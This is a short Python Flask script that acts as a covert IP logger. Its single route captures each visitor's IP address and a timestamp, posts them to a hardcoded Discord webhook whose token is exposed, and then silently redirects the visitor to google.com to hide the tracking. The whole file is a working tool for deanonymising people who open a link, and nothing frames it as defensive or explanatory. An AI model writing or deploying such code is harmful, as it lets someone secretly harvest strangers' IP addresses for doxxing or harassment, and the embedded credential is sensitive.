from flask import Flask, request, redirect
from datetime import datetime
import requests


app = Flask(__name__)

def send_ip(ip, date):
    webhook_url = "https://discordapp.com/api/webhooks/1351018752161878057/DH2Pr1jPgLtMlJ85_erMiQjcsb9ic71ZRdYIm9QGNI1dr6iFJQygPK4GgIvBQOePZqb8"
    data = {
        "content": "",
        "title": "IP Logger"
    }
    data["embeds"] = [
        {
            "title": ip,
            "description": date
         }
    ]
    requests.post(webhook_url, json=data)

@app.route("/")
def index():
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")

    send_ip(ip, date)

    return redirect("https://google.com")



if __name__ == "__main__":
    app.run(host='0.0.0.0')
